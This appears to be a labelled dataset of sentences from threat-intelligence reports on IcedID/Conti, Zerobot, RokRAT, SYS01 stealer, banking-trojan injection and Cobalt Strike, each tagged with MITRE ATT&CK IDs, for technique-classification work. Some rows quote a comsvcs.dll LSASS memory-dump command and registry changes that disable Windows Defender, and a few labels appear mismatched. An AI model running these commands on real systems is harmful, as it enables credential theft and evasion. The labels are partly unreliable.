The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.,T1090
"The below traffic shows more details of the RDP session, including the username in the cookie.","T1090, T1021.001"
This proxied traffic reported back the hostname of the threat actors machine as “mikespc”.,T1090
"Defense Evasion To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.","T1562.001, T1484.001"
They then force updated the GPO on all clients using Cobalt Strike.,T1484.001
"ParentCommandLine CommandLine C:\Windows\System32\dllhost.exe C:\Windows\system32\cmd.exe /C gpupdate /force C:\Users\USER\AppData\Local\Temp\icju1.exe C:\Windows\system32\cmd.exe /C gpupdate /force C:\Windows\System32\dllhost.exe C:\Windows\system32\cmd.exe /C gpupdate /force “rundll32.exe” c:\windows\192145.dll,StartW C:\Windows\system32\cmd.exe /C gpupdate /force Registry Keys Action HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem DeleteValue HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection DeleteKey","T1059.003, T1112"
"Credential Access LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller.",T1003.001
"Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",T1055
"Zerobot, a Go-based botnet that spreads primarily through IoT and web application vulnerabilities, is an example of an evolving threat, with operators continuously adding new exploits and capabilities to the malware.",T1190
"The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities.",T1190
Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.,"T1078, T1110"
The malware may attempt to gain device access by using a combination of eight common usernames and 130 passwords for IoT devices over SSH and telnet on ports 23 and 2323 to spread to devices.,T1110
"Zerobot 1.1 includes several new vulnerabilities, such as: VulnerabilityAffected softwareCVE-2017-17105Zivif PR115-204-P-RSCVE-2019-10655GrandstreamCVE-2020-25223WebAdmin of Sophos SG UTMCVE-2021-42013ApacheCVE-2022-31137Roxy-WICVE-2022-33891Apache SparkZSL-2022-5717MiniDVBLinuxSince the release of Zerobot 1.1, the malware operators have removed CVE-2018-12613, a phpMyAdmin vulnerability that could allow threat actors to view or execute files.",T1190
"Upon gaining device access, Zerobot injects a malicious payload, which may be a generic script called zero.sh that downloads and attempts to execute Zerobot, or a script that downloads the Zerobot binary of a specific architecture.",T1105
"The bash script that attempts to download different Zerobot binaries tries to identify the architecture by brute-force, attempting to download and execute binaries of various architectures until it succeeds, as IoT devices are based on many computer processing units (CPUs).","T1105, T1082"
"On Windows machines, the malware copies itself to the Startup folder with the file name FireWall.exe",T1547.001
The following are the previously known Zerobot capabilities: Attack methodDescriptionUDP_LEGITSends UDP packets without data.,T1095
Sends a handshake and status request.,T1095
TCP_HANDSHAKEFloods with TCP handshakes.,T1095
TCP_SOCKETContinuously sends random payloads on an open TCP socket.,T1095
Payload length is customizable.,T1071.001
TLS_SOCKETContinuously sends random payloads on an open TLS socket.,T1095
HTTP_HANDLESends HTTP GET requests using a Golang standard library.,T1071.001
HTTP_RAWFormats and sends HTTP GET requests.,T1071.001
HTTP_BYPASSSends HTTP GET requests with spoofed headers.,T1071.001
HTTP_NULLHTTP,T1071.001
headers are each one random byte (not necessarily ascii).Previously undisclosed and new capabilities are the following: Attack methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.,"T1095, T1071.001"
"ICMP_FLOODSupposed to be an ICMP flood, but the packet is built incorrectly.",T1095
TCP_CUSTOMSends TCP packets where the payload and flags are fully customizable.,T1095
TCP_SYNSends SYN packets.,T1095
TCP_ACKSends ACK packets.,T1095
TCP_SYNACKSends SYN-ACK packets.,T1095
TCP_XMASChristmas tree attack (all TCP flags are set).,T1095
"Microsoft researchers also identified a sample that can run on Windows based on a cross-platform (Linux, Windows, macOS) open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.","T1059.003, T1113, T1219"
"The script, which is used to download this RAT, is called impst.sh: Figure 1.",T1105
"let IoCList = externaldata(TimeGenerated:datetime,IoC:string,IoC_Type:string,ExpirationDateTime:datetime,Description:string, Action:string, ConfidenceScore:real, ThreatType:string, Active:string,Type:string, TrafficLightProtocolLevel:string, ActivityGroupNames:string)[@""https://raw.githubusercontent.com/microsoft/mstic/master/RapidReleaseTI/Indicators.csv""] with(format=""csv"", ignoreFirstRecord=True); let shahashes = IoCList | where IoC_Type =~ ""sha256"" and Description =~ ""Dev-1061 Zerobot affecting IoT devices"" | distinct IoC; DeviceFileEvents | where SHA256 in (shahashes) Zerobot HTTP requests This query finds suspicious HTTP requests originated by the IOCs associated with Zerobot activity.",T1071.001
This attachment (unless zipped) is the MyDoom executable.,T1566.001
"DATA FORMAT ERROR Returned mail: see transcript for details Mail System Error - Returned Mail The following attachment names were also found to be used repeatedly: document.zip transcript.zip letter.zip attachment.zip .zip message.zip message.scr golfasian.com readme.scr mail.zip text.cmd <random number>@7686f6a96.com file.zip attachment.scr Typical attachment The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.).",T1566.001
"Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze.",T1027
MyDoom Unpacked The packer decompresses and executes the actual MyDoom code.,T1027
"Upon execution, an attempt to alter the Windows firewall settings is made.",T1562.001
"MyDoom next makes a copy of itself, places it in the “Temp” folder (C:\Users\<user>\AppData\Local\Temp), and changes the name to a known Windows application/process.",T1036.005
"History Just as its name suggests, TrueBot is a downloader trojan botnet that uses command and control servers to collect information on compromised systems and uses that compromised system as a launching point for further attacks, as seen recently with Clop Ransomware.",T1041
Figure 1.2 Update.exe being downloaded A user had to click on this in order to execute the malware.,T1204.002
"Upon execution, the malware immediately begins to look for EDR and antivirus software.",T1518.001
"At the address, the executable ‘3ujwy2rz7v.exe’ was downloaded and then launched by cmd.exe.","T1105, T1059.003"
Figure 1.4 3ujwy2rz7v.exe activity The executable then connected to the C2 domain name ‘dremmfyttrred[.]com’.,T1003.001
"The activity thereafter included dumps of LSASS, exfiltration of data, and system and process enumerations.","T1003.001, T1057"
"The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a second stage RokRAT shellcode.","T1027, T1105"
"RokRAT can execute remote C2 commands, data exfiltration, file download/upload, and keylogging.","T1105, T1056.001"
"Key Findings: ITG10 likely targeting South Korean government, universities, think tanks, and dissidents Phishing emails spoof legitimate senders to deliver RokRAT via LNK files Email attachments mimic legitimate documents Additional malware samples possibly related to ITG10 RokRAT campaigns Decoy Documents In late April 2023, X-Force uncovered several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns operated by ITG10. X-Force assesses that the documents are likely decoys geared toward various personnel within two subsets of activity: South Korean government, communication, and educational centers; and energy, manufacturing, and supply chain.",T1566.001
"Based on the document’s content, academic and government employees, especially those in intelligence and cybersecurity, are probable targets for phishing emails containing this type of decoy document.",T1566.001
"RokRAT campaigns typically begin with a phishing email with a ZIP file attachment, containing a LNK file disguised as a Word document.",T1566.001
"When the LNK file is activated, a PowerShell script is executed, opening a decoy document to start the download process of RokRAT which is hosted at OneDrive or similar cloud application.",T1105
"In X-Force’s analysis of recent RokRAT-related files, in lieu of a ZIP file, we found Optical Disc Image files (ISO) containing LNK files that had slightly modified PowerShell scripts, and Hangul Word Processor decoy documents (HWP).",T1027
"ISO Files The ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file.","T1027, T1059.003"
"Once the LNK file is executed, it extracts and drops a decoy file, and a batch file within the user’s %TEMP% folder.",T1059.003
"There is no use of OneDrive or similar cloud applications to host a second-stage payload, and instead of dropping a batch file, these LNK files drop VBS, with the obfuscation technique for the dropped files being hex-encoding vs. string concatenation.",T1027
"In addition, the RokRAT LNK files drop batch files and downloads the payload that is decoded using the first byte as a key, then the payload is executed using Windows API functions (VirtualProtect).","T1105, T1106, T1059.003, T1140"
"The LNK files analyzed contain an encoded PowerShell, and once the LNK files are executed, the PowerShell script is run, and two files are dropped to the user’s %TEMP% folder.",T1027
"In a third file we analyzed, instead of the LNK file dropping a VBS and a Plaintext file, a VBS file and a JPEG decoy file are dropped to the users %TEMPT% folder.",T1027
"In this case, the JPEG decoy file appears to be a correspondence related to the “Proof of Digital Assets”.",T1027
"However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",T1074.001
Malicious documents that implement this technique require users to double-click a document element.,T1204.002
"This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe).",T1204.002
"Features of Crimson RAT include exfiltrating system information, capturing screenshots, starting and stopping processes, and enumerating files and drives.","T1083, T1005, T1113"
Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \SOFTWARE\Microsoft\Windows\CurrentVersion\Run only if the victim’s machine name differs.,T1547.001
"Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.",T1027
"Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry message With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the addition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT.",T1027
"The threat actors behind the campaign are targeting Facebook business accounts by using Google ads and fake Facebook profiles that promote things like games, adult content, and cracked software, etc. to lure victims into downloading a malicious file.",T1204.002
"The attack is designed to steal sensitive information, including login data, cookies, and Facebook ad and business account information.",T1005
The loader is usually a legitimate C# application susceptible to a side-loading vulnerability that comes with a hidden malicious dynamic link library (DLL) file that’s eventually side-loaded to the application.,T1574.002
"The scripts are encoded using different techniques, which makes their analysis and detection harder.",T1027
"Infection chain The Loader We’ve seen the payload delivered in diverse ways including DLL side-loading, Rust and Python executables, and many others.",T1574.002
There are many other variations of these methods with minor modifications.,T1574.002
DLL Side-Loading V1,T1574.002
"In this method, the victim downloads a zipped folder with different luring themes such as world cup live streaming, free applications, and more that abuse legitimate applications vulnerable to DLL side-loading attack.",T1574.002
"A benign, legitimate executable abused to side-load the malicious DLL",T1574.002
The Inno-Setup installer to be executed (base64 encoded with some string modifications) DLL (hidden).,T1027
The malicious side loaded DLL Western Digital's WDSyncService.exe executable abused to side-load a malicious DLL,T1574.002
"If it doesn’t, it downloads the file from its command and control (C2) server, then decodes and executes it.","T1105, T1140"
"In the main thread the SFX/ZIP file is executed/decompressed, and the victim is shown the decoy HTML files.",T1140
"Instead, they’re downloaded from the C2 using the following pattern: https://<domain>/files/dld?t=wcup.",T1105
Downloads the .dat file as a ZIP dld Download the License (base64 encoded with string replacements),T1027
t Is the theme used as a decoy Side loaded malicious DLL,T1574.002
"As mentioned, the License file is the next stage Inno-Setup installer that drops the PHP information stealer.",T1574.002
DLL Side-Loading V2,T1574.002
Garmin’s ElevatedInstaller.exe executable abused to side-load malicious DLL,T1574.002
The above image shows an example of Garmin’s ElevatedInstaller.exe being abused to side-load the malicious DLL.,T1574.002
"Once the executable starts running, it side-loads the malicious DLL that decodes and drops three files to the %temp% folder:","T1574.002, T1140"
Executable that accepts an executable as an argument and executes it with hidden console <,T1059.003
"[A-Z0-9]{15}>.exe Rust executable compiled with Cargo Next, it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.",T1053.005
Dropping a Rust executable and popping a fake message box The Rust executable then downloads the next stage—an Inno-Setup installer that deploys the PHP information stealer from <domain_name>/files?t=<theme_name>&tp=d. We’ve also spotted similar delivery methods that dropped Python executables compiled with Nuitka instead of Rust to drop the next stage Inno-Setup.,T1574.002
"DLL Side-Loading V3 Similar to the other delivery methods, in this scenario a victim downloads what seems to be a game, movie, nude album, etc. FUD ZIP file with malicious DLL All the executables named as image files are in fact the same benign executable—WDSyncService.exe that is abused to side-load a malicious DLL named WDSync.dll. Zipped folder with the same executable file: WDSyncService.exe that side-loads WDSync.dll The WDSyncService.exe file is signed by Western Digital and acts as Western Digital’s sync service, which is written in C#.",T1574.002
"Additionally, this executable uses several shared libraries, including WDSync.dll which is hidden in the ZIP file and obfuscated with SmartAssembly.",T1027
The rest of the DLLs WDSyncService.exe uses are compressed and encrypted within WDSync.dll using the embedding dependencies feature by SmartAssembly.,T1027
"WDSync.dll embeds legitimate DLLs using the SmartAssembly feature Once a victim has executed one of the executables from the ZIP folder, a fake message box pops up and alerts the user to install a “framework” to open the file.",T1027
It starts with de-obfuscating the next stage (string replacements + base64 decoding) and writing it to a %tmp% folder under the hardcoded name TS.exe and executing it with “t” as an argument.,T1140
"Once the execution completes, the file is deleted to leave no evidence on the machine.",T1070.004
"Drops ”TS.exe” and executes it with t as an argument The dropped executable (TS.exe) can be executed with one of the following options: t, d t|d options that the executable accepts Option t copies the executable to %appdata%\Packages\TS.exe and registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument.",T1053.005
Creates a scheduled task to be executed with d as an argument Option d checks if the file %localappdata%\m.txt exists.,T1053.005
"If the file does not exist, the executable decodes and drops the next stage Inno-Setup executable to %temp%\\<[A-Z]{15}.exe> and executes it with /VERYSILENT /SUPPRESSMSGBOXES /NORESTART as arguments.",T1140
"As before, when the execution finishes the file is deleted to remove evidence from the machine.",T1070.004
"Drops next stage Inno-Setup executable Inno-Setup to PHP Information Stealer Once the Inno-Setup installer executes, it drops a PHP application with additional files, usually to %localappdata\[A-Z]{4}\<version_number>.",T1105
"Between different variants of this information stealer, we saw the following files used to execute the malicious logic: include.php Responsible for installing persistence via scheduled tasks index.php Executes the main logic of the stealing act version.php (embedded in index.php if it does not exist)",T1053.005
Base64 encoded string with several string replacements.,T1027
"Once decoded, this executable, written in Rust and compiled with Cargo, gets the current date and time, and decrypts Chromium-based browsers’ encryption key In older variants the PHP scripts were not obfuscated in any manner.",T1140
"In newer variants we noticed commercial encoders ionCube and Zephir, which are self-written extensions that obfuscate the PHP scripts.",T1027
"After dropping the folder, the Inno-Setup executable executes php.exe include.php, or passes this command line as an argument to rhc.exe. include.php registers two scheduled tasks: rhc.exe php.exe include.php rhc.exe php.exe index.php rhc.exe php.exe index.php","T1059.003, T1053.005"
The attacker must know the time to set it in the scheduled task.,T1053.005
"It does this by decoding the rss.txt into an executable, adding a uniquid at the end of the executable, and dropping it to %temp%\tmp\<uniqid>.exe.",T1140
"If for some reason the operation fails, this script gets the current date and time running: “wmic os get LocalDateTime /value”.","T1047, T1053.005"
createTS—creates scheduled task.,T1053.005
createLG—creates scheduled task at logon index.php is the script where the stealing logic takes place.,T1053.005
"Extracting Facebook’s session cookies – xs and c_user If the victim has a logged in Facebook account (checked with xs name in Facebook’s cookie), and the rs_flag (resource flag) is set to true, the attacker will query Facebook’s graph API using the access token, obtained via Facebook’s graphql API, to steal the victim’s Facebook information and send it back to the C2.",T1041
The stolen information is that set as fields in the URL parameter: C2 response—Facebook's graph API used to access sensitive information Extract victim’s sensitive Facebook data using the graph API and send the results to a C2 server dlAR Download and run.,"T1041, T1105"
Downloads a file from the given URL and executes it with the given arguments.,T1105
"dlAR task At the time of writing, in the given task the downloaded file was an Inno-Setup executable that dropped a legitimate WD Discovery app to side-load","T1574.002, T1105"
"the malicious WDLocal.dll. Western’s Digital WDDdiscovery.exe side-loads malicious WDLocal.dll The side-loaded DLL issues a GET request to one of its hardcoded URLs with parameters stating the old machine ID, new machine ID, and the current version of the information stealer.",T1574.002
"The response is parsed, and the new stealer is downloaded and executed.",T1105
"Next, it creates a scheduled task that executes the updated routine, which triggers at log-on and every 30 minutes.",T1053.005
"Information Stealer update routine upload Asks for a file to be uploaded to the C2, checks whether the file exists, and uploads it.",T1105
"Upload file function r Gets a command to run, executes it, and posts the result back to the C2.","T1105, T1059.003"
Gets command from C2 and executes it dl Sends a get request with the parameter “a=update” to the C2 and does the same as the dlAR task.,T1059.003
How do You Combat SYS01 stealer? DLL side-loading is a highly effective technique for tricking Windows systems into loading malicious code.,T1574.002
"Adversaries use side-loading attacks for execution, persistence, privilege escalation, and defense evasion.",T1574.002
"And malicious payloads are also sometimes encrypted/packed or obfuscated until loaded into runtime memory, which detection-based tools struggle to effectively scan.",T1027
"Trickbot goes through processes one by one to find browsers to inject with its webinjects module, using a stealthy technique known as reflective injection.",T1057
"The webinjects module hooks the API calls responsible for sending, receiving or encrypting data sent to a web server.",T1106
"By intercepting the data before it is encrypted, the malware can read HTTP-POST headers and manipulate them on the fly.",T1071.001
The malware can extract this information and send it to its command and control (C2) server without actually sending the forged headers to the targeted web page server.,T1041
Frequently hooked API functions.,T1106
How to Detect Webinjects This technique can be prevented by detecting an injection into a web browser process.,T1055
The injected thread calls the NtProtectVirtualMemory function where the NewAccessProtection argument is PAGE_EXECUTE_READWRITE and the BaseAddress argument is an address to a library function targeted by banking Trojans.,"T1106, T1055"
"Instead, they suspend the remote process threads and install the hooks remotely.",T1055
"Once the banking Trojan executes in the context of the parent process, it hooks process creation library functions and waits until the real target is created.",T1106
"This technique can be prevented by looking for an injection into explorer.exe or runtimebroker.exe, where the injected thread hooks process creation functions like NtCreateUserProcess, NtCreateProcessEx, CreateProcessInternalW, CreateProcessA or CreateProcessW. Named Pipe Communication Between Injected Processes Many banking Trojans use named pipes to communicate with various processes under the threat actor’s control.",T1106
"To do this, they inject their main bot into a Windows process, and then inject their other modules into different processes according to the module’s purpose.",T1055
"For example, Trickbot injects the main bot into svchost.exe.",T1055
How to Prevent Named Pipe Communication Between Injected Processes This technique can be prevented by inspecting named-pipe events.,T1055
"Trickbot and Emotet loaders use Heaven's Gate for process hollowing from a WoW64 process into a 64-bit svchost.exe (For more about process hollowing, see the section on Evasive Process Hollowing By Entrypoint Patching below).",T1055
Emotet using Heaven's Gate in its Microsoft Outlook Messaging API (MAPI) module.,T1106
"This can be done by placing hooks on critical APIs, generating a stack trace and inspecting the stack trace for wow64cpu.dll.",T1106
WoW64’s normal syscall flow.,T1055
"Evasive Process Hollowing by Entrypoint Patching Process hollowing is a process injection technique that creates a new legitimate process in a suspended mode, unmaps its main image and replaces it with malicious code.",T1055
The malicious code is written into the newly created process and the suspended thread context instruction pointer is changed using NtGetContextThread/NtSetContextThread.,T1055
"Trickbot implemented process hollowing by first using VirtualProtectEx on the process entrypoint, and then writing the hook stub using WriteProcessMemory. Figure 8.",T1055
How to Prevent Evasive Process Hollowing by Entrypoint Patching This technique can be prevented either by inspecting whether the address argument provided to the calls of NtWriteVirtualMemory or NtProtectVirtualMemory is a remote process entry point or by detecting suspicious remote mapping and reading of svchost.exe memory.,T1055
PE Injection Common injection methods used by banking Trojans involve writing a mapped PE into a remote process using WriteProcessMemory.,T1055
"Some malware families try to obscure the call by wiping artifacts from the buffer, such as wiping the PE header.",T1027
"For example, Zeus variants use this technique to inject themselves into other processes, allowing them to stay hidden, as well as to perform webinjects and to perpetrate financial data theft. Figure 10.",T1055
How to Prevent PE Injection This technique can be prevented by inspecting the buffer sent to NtWriteVirtualMemory for executable artifacts.,T1055
Process Injection via Hooking Hooking can be used as an injection technique.,T1055
"This technique utilizes hooking to get code execution, usually by hooking a frequently called API function with a jump to a payload/shellcode.",T1106
This avoids calling any suspicious APIs often used in code injection techniques like CreateRemoteThread or NtSetContextThread.,T1106
"For instance, IcedID injects its main bot into a hollowed instance of svchost.exe using API hooking.",T1055
"However, because IcedID hooked NtCreateUserProcess, the hook handler is called right after the call to CreateProcessA. In the handler, it performs the following activities: Unhooks NtCreateUserProcess Calls NtCreateUserProcess (which creates svchost.exe) Decompresses a local buffer that contains the payload to inject using RtlDecompressBuffer Allocates memory for the payload at the remote svchost.exe process Writes the payload into the remote svchost.exe using NtAllocateVirtualMemory and ZwWriteVirtualMemory",T1140
"The provided address argument for NtProtectVirtualMemory is an exported function from one of the Windows libraries, and the NtWriteVirtualMemory written buffer is a hooking stub.",T1106
"In both cases, the remote process has to be a known injection target.",T1055
AtomBombing Injection Technique AtomBombing is a technique that allows malware to inject code while avoiding calling suspicious APIs that security vendors are watching.,T1055
Dridex uses a slightly modified AtomBombing technique that injects one of its stages into a Windows process (usually explorer.exe) and employs various steps to cause financial data theft.,T1055
"Malware using the AtomBombing technique first writes the payload into the global atom table, which can be accessed by all processes.",T1055
"They then dispatch an asynchronous procedure call (APC) to the APC queue of a target process thread using NtQueueApcThread, forcing the target process to call GlobalGetAtomA.",T1055
"For the execution, the injector process dispatches another APC using NtQueueApcThread to force the remote process to execute NtSetContextThread.",T1055
"The injected process then calls NtSetContextThread, which invokes a return-oriented programming (ROP) chain that allocates execute/read/write (RWX) memory.",T1055
"The unique idea behind AtomBombing is the write-primitive, which allows writing to the remote process using atom tables and APC.",T1055
Dridex uses a variation of AtomBombing that queues an APC to call memset to clean an RW region in ntdll.dll.,T1055
"Finally, it queues an APC into the patched GlobalGetAtomA to get the payload running. Figure 14.",T1055
"These techniques can be prevented by inspecting whether the arguments provided to NtQueueApcThread/NtSetContextThread calls point to a suspicious API – the APC routine argument in the case of NtQueueApcThread, or the new instruction pointer in the context argument in the case of NtSetContextThread.","T1106, T1055"
Both API calls have to be called into a remote process.,T1106
We have explored some of the more interesting banking Trojan techniques and how they’re used to steal victims’ sensitive data.,T1005
title: Tracking Traces of Malware Disguised as Hancom Office Document File and Being Distributed (RedEyes) url: https://asec.ahnlab.com/en/53377/ AhnLab Security Emergency response Center (ASEC) has confirmed the distribution of malware disguised as Hancom Office document files.,T1036.005
The malware that is being distributed is named “Who and What Threatens the World (Column).exe” and is designed to deceive users by using an icon that is similar to that of Hancom Office.,T1036.005
"Decompressing the compressed file reveals a relatively large file with a size of 36,466,238 bytes.","T1027, T1140"
"In Figure 2, a trace can be observed of the malware creating a folder named onedrivenew in the AppData directory and self-copying itself with the filename onedrivenew.exe to appear as a normal file.",T1036.005
"In Figure 3, a trace can be seen of the malware creating and executing a normal Hancom Office file with the same filename as the malware within the same directory where the malware was executed.",T1036.005
The malware is injected and executed within the normal Windows process called mstsc.exe.,T1055
The original file is deleted using the cmd command.,T1070.004
"Trace data of the normal Windows process, mstsc.exe Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.",T1055
The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.,"T1547.001, T1112"
"Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.","T1071.001, T1036.005, T1053.005"
"The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.","T1053.005, T1036.005"
"This shows that Cobalt Strike, although it was originally created as a legitimate tool, continues to be something defenders need to monitor, as attackers are using it to set up attacks.",T1090
"The threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network, redirecting a Myanmar government owned-domain to an attacker-controlled server.",T1090
What's New? Cisco Talos discovered a malicious campaign using an obfuscated Meterpreter stager to deploy Cobalt Strike beacons in September 2021.,T1027
One of the techniques to conceal the traffic from DNS-based filtering is Domain Fronting.,T1090
Domain fronting uses legitimate or high-reputation domains to remain undetected by defenders.,T1090
The attacker's choice of Myanmar-specific domains for domain fronting may indicate an interest in the geopolitics of this area of the world.,T1090
"While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon's traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon's configuration.",T1071.001
The actor likely changed the configuration to test their infrastructure and the domain fronting functionality before launching the attack.,T1090
"Domain fronting The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.",T1090
"Although there are no indications that the previous defacement of the domain by the Brotherhood of Myanmar and the campaign described in this post are related, the domain itself is clearly of interest to various actors.",T1090
Domain fronting can be achieved with a redirect between the malicious server and the target.,T1090
Malicious actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.,T1090
"The DNS request that led them there will be lost and relies on other parts of the HTTP request, including the Host header and the actual C2 test[.]softlemon[.]net.",T1071.001
Cobalt Strike payload The beacons are of particular interest due to the domain fronting technique using a government host as the initial DNS lure.,T1090
We spotted a suspicious section .kxrt with the packed and encoded malicious code.,T1027
The loader next calls the VirtualProtect function to set the virtual memory page permissions to Read-Write-Execute and writes the image base of the Cobalt Strike beacon which will be executed in a new thread.,T1106
"After allocating the virtual memory and setting the page permissions to Read-Write-Execute, a decryption routine is executed that decrypts the remaining malicious code in the .kxrt section and writes it to the virtual memory.",T1140
Decoder routine to decrypt the beacon DLL.,T1140
The decrypted malicious code is the actual Cobalt Strike beacon.,T1140
"Once decoded, the loader's execution jumps to the beginning of the DLL resulting in a reflective-load of the beacon into the loader process memory.",T1140
This beacon is now responsible for decoding the configuration.,T1140
The beacon resolves the proxy by calling WinHTTPGetProxyForUrlEx and WinHTTPCreateProxyResolver to bypass the proxy for the URL.,T1106
"The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host test[.]softlemon[.]net, also proxied by Cloudflare.",T1090
The beacon can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy.,T1112
The beacon modifies the victim's system power and lid open/close policies in the registry.,T1112
Conclusion Domain fronting is a technique used by attackers to circumvent protection based on DNS filtering.,T1090
"When the beacon is launched, it will submit a DNS request for a legitimate high-reputation domain hosted behind Cloudflare infrastructure and modify the subsequent HTTPs requests header to instruct the CDN to direct the traffic to an attacker-controlled host.",T1090
[T1133 – External Remote Service] External IP access from the threat actor was routed through European TOR VPN exit nodes.,T1090
Incident #2 VPN access using Single Factor authentication.,T1078
Credential Access Incident #1 Minidump of LSASS process memory leveraging comsvcs.dll with proxy execution by rundll32.exe.,"T1003.001, T1218.011"
"/c for /f """"tokens=1,2 delims= """" ^%A in ('""""tasklist /fi """"Imagename eq lsass.exe"""" | find """"lsass""""""""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\FP4.docx full"" The use of a .docx extension is not as common as .dmp or .txt",T1218.011
title: Using the Minidump function of comsvcs.dll description: The minidump function of comsvcs.dll can be used to dump lsass.exe.,T1003.001
T1003.001 Discovery Incident #1 Conducting discovery indirectly via schedule tasks named “Windows Update” performing remote directory listings.,"T1083, T1053.005"
"[T1053.005 – Scheduled Task/Job: Scheduled Task] C:\>type c:\programdata\HP\ms.bat dir """"\\10.1.100.64\c$\ProgramData"""" >> C:\programdata\HP\svr_dir.txtt"" Leveraging a dual-use tool, PCHunter64, to acquire detailed process and system information.",T1082
We have also included an example Sigma detection rule for the activity shown in incident #1. title: Listing Directories of Remote Hosts description: Threat actors can use windows binaries and commands to discover interesting to them directories on remote hosts and redirect the output to a file on disc for later consumption.,"T1083, T1059.003"
"T1083 Lateral Movement Incident #1 There were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network; as a result, this activity was captured by multiple event types.",T1021.001
Event ID [1149] - RDP connection established Event ID,T1021.001
"Username hint: <Redacted> ""<Provider Name=""""Microsoft-Windows-RemoteDesktopServices-RdpCoreTS"""" Guid=""""{1139C61B-B549-4251-8ED3-27250A1EDEC8}"""" /> <EventID>131</EventID> <Version>0</Version> <Level>4</Level> <Task>4</Task> <Opcode>15</Opcode> <Keywords>0x4000000000000000</Keywords> <TimeCreated SystemTime=""""2023-04-06T09:23:41.969586500Z"""" /> <EventRecordID>633</EventRecordID> <Correlation ActivityID=""""{F4208FE1-4D5D-45DF-B8E2-A851AC3F0000}"""" /> <Execution ProcessID=""""1136"""" ThreadID=""""2228"""" /> <Channel>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational</Channel> <Computer> <Redacted> </Computer> <Security UserID=""""S-1-5-20"""" /> </System> <EventData> <Data Name=""""ConnType"""">TCP</Data> <Data Name=""""ClientIP""""> <Redacted>:56736</Data> </EventData> </Event>"" Incident #2 Similar to Incident #1, the threat actor was able to RDP unencumbered across the organization’s infrastructure.",T1021.001
"Defense Evasion Incident #1 The threat actor executed two actions to bypass Windows Defender [T1562.001 – Impair Defenses: Disable or Modify Tools] 5001 - Real-time Protection was disabled New Value"">HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ Guidance The first line of defense available to organizations is to use a security agent that has robust tamper protection.",T1562.001
"Command and Control Incident #1 During this incident, the threat actor leveraged one of the most popular dual-use agents, AnyDesk, to provide persistent remote access into the affected organization on multiple systems.",T1219
"Collection Incident #2 A confirmed compromised account was used to download the WinRar archiving software and several files were staged for possible, but unconfirmed exfiltration [T1560.001 – Archive Collected Data: Archive via Utility] URL Visited: hxxps://notifier.rarlab[.]com/?language=English&source=RARLAB&landingpage=first&version=621&architecture=64 Userassist 2023-03-15T10:15:55Z C:\Users\<Redacted>\Downloads\winrar.exe Userassist 2023-03-15T11:04:42Z C:\ProgramData\winrar.exe URL Visited: E:/<Redacted>Dept.rar URL Visited: E:/<Redacted>Channel.rar Guidance Often by the time a threat actor is staging data, it’s too late to have a good security outcome.",T1074.001
"This specific malware is observed to log keystrokes, steal credentials, tamper with system files as all RATs do, but also steals cryptographic keys to access cryptocurrency wallets on infected systems.",T1056.001
This jRAT is spread via spear phishing emails that contain a .csv or .xlt file attachment with a so-called Dynamic Data Exchange (DDE) code injection that intends to compromise Microsoft Excel and circumvent signature-based antivirus protections.,T1566.001
